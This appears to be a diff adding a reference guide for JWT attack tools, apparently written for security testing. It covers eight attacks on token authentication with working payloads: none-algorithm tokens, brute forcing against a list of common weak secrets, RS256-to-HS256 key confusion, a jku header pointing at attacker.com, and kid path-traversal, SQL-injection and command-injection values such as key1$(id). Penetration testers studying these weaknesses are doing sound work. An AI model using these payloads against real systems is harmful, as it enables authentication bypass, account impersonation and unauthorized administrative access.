@@ -1,0 +1,144 @@
+=== JWT Analysis & Attack Tools (8 Attack Types) ===
+
+--- TOOLS ---
+
+  jwt_decode(token)                Decode header, payload, signature
+  jwt_forge(header, payload, algorithm, secret?, privateKey?)   Create/modify JWT
+  jwt_none_attack(token)           Generate JWT with "none" algorithm variants
+  jwt_key_confusion(token, publicKey)  RS256->HS256 algorithm confusion
+  jwt_bruteforce(token, wordlist?)    Brute force HMAC secret
+
+--- RECONNAISSANCE ---
+
+  jwt_decode(token="eyJhbGci...")
+  -> Returns header (algorithm, type, kid, jku), payload (claims), signature
+
+  Key fields to examine:
+    alg    Algorithm (HS256, RS256, ES256, none)
+    kid    Key ID -- may be injectable (path traversal, SQLi, command injection)
+    jku    JWK Set URL -- may be spoofable to attacker-controlled JWKS
+    x5u    X.509 URL -- similar to jku
+    jwk    Embedded public key -- may allow self-signed tokens
+    sub    Subject (user identifier to modify)
+    exp    Expiration time
+    admin, role, permissions    Authorization claims to modify
+
+--- ATTACK 1: SIGNATURE VERIFICATION CHECK ---
+
+  Before testing attacks, verify signatures are validated:
+  Tamper the payload (change "sub" claim) without changing signature.
+  Send tampered token. If accepted -> CRITICAL: no signature verification.
+
+--- ATTACK 2: NONE ALGORITHM ---
+
+  jwt_none_attack(token="eyJhbGciOiJIUzI1NiIs...")
+  -> Generates tokens with alg: none, None, NONE, nOnE
+  -> Signature stripped, trailing dot preserved: header.payload.
+
+  If server accepts -> complete auth bypass, arbitrary user impersonation.
+
+--- ATTACK 3: WEAK SECRET BRUTE FORCE ---
+
+  jwt_bruteforce(token="eyJhbGci...", wordlist=["secret","password","jwt_secret",...])
+  -> Tests 40 common defaults + custom wordlist
+  -> If found: jwt_forge with any claims using discovered secret
+
+  Common weak secrets:
+    secret  secret123  password  password123  jwt_secret
+    your-256-bit-secret  your-secret-key  supersecret
+    changeme  key  private  qwerty  12345678
+
+  External wordlist: jwt_tool.py <token> -C -d jwt.secrets.list
+
+--- ATTACK 4: ALGORITHM CONFUSION (RS256->HS256) ---
+
+  jwt_key_confusion(token="eyJhbGciOiJSUzI1NiIs...", publicKey="-----BEGIN PUBLIC KEY-----\n...")
+
+  Theory:
+    RS256: signs with private key, verifies with public key
+    HS256: signs and verifies with same shared secret
+  If library uses public key for both without checking algorithm:
+    Change alg RS256->HS256, sign with public key as HMAC secret.
+
+  Steps:
+    1. Extract public key: openssl s_client -connect TARGET:443 | openssl x509 -pubkey -noout
+    2. jwt_key_confusion(token=TOKEN, publicKey=PEM_STRING)
+    3. Send result as Bearer token
+
+--- ATTACK 5: JKU HEADER INJECTION ---
+
+  If server fetches keys from jku URL without validation:
+    1. Generate RSA keypair
+    2. Host JWKS at attacker URL with your public key
+    3. jwt_forge(
+         header='{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json","kid":"my-key"}',
+         payload='{"sub":"admin","role":"administrator"}',
+         algorithm="RS256",
+         privateKey="-----BEGIN RSA PRIVATE KEY-----\n..."
+       )
+    4. Send token -- server fetches attacker's JWKS for verification
+
+  Use collaborator_generate_payload() to test if server fetches jku URL.
+
+--- ATTACK 6: KID PARAMETER INJECTION ---
+
+  kid identifies which key to use. May be injectable:
+
+  Path traversal via kid:
+    jwt_forge(
+      header='{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}',
+      payload='{"sub":"admin"}',
+      algorithm="HS256",
+      secret=""
+    )
+    -> /dev/null is empty, so empty string is the signing key
+
+  SQL injection via kid:
+    jwt_forge(
+      header='{"alg":"HS256","typ":"JWT","kid":"key1\\' UNION SELECT \\'ATTACKER\\'-- -"}',
+      payload='{"sub":"admin"}',
+      algorithm="HS256",
+      secret="ATTACKER"
+    )
+    -> UNION injects known value as key, sign with that value
+
+  Command injection via kid:
+    kid values to test: key1|id, key1;id, key1`id`, key1$(id)
+
+--- ATTACK 7: EMBEDDED PUBLIC KEY (CVE-2018-0114) ---
+
+  Some implementations accept a public key embedded in the JWT header:
+    jwt_forge(
+      header='{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<modulus>","e":"AQAB"}}',
+      payload='{"sub":"admin"}',
+      algorithm="RS256",
+      privateKey="-----BEGIN RSA PRIVATE KEY-----\n..."
+    )
+    -> Server uses embedded key for verification instead of its own
+
+--- ATTACK 8: TOKEN EXPIRATION ISSUES ---
+
+  Test expired token acceptance:
+    jwt_decode(token=EXPIRED_TOKEN) -> check exp claim
+    Send expired token -> if accepted, exp not validated
+
+  Test token without expiration:
+    jwt_forge(payload='{"sub":"admin"}', ...) -> omit exp claim
+    -> If accepted, exp not required
+
+  Cross-service token reuse:
+    Take JWT from Service A -> use on Service B
+    -> If accepted, services share keys or don't validate issuer
+
+--- DETECTION PATTERNS ---
+
+  Success: 200 OK with admin data, different user context, token accepted after modification
+  Failure: 401 Unauthorized, "Invalid token", "Algorithm not allowed"
+
+--- PARAMETER REFERENCE ---
+
+  jwt_decode:        token (JWT string)
+  jwt_forge:         header (JSON), payload (JSON), algorithm, secret?, privateKey?
+  jwt_none_attack:   token (JWT string)
+  jwt_key_confusion: token (JWT string), publicKey (PEM string)
+  jwt_bruteforce:    token (JWT string), wordlist? (List<String>)
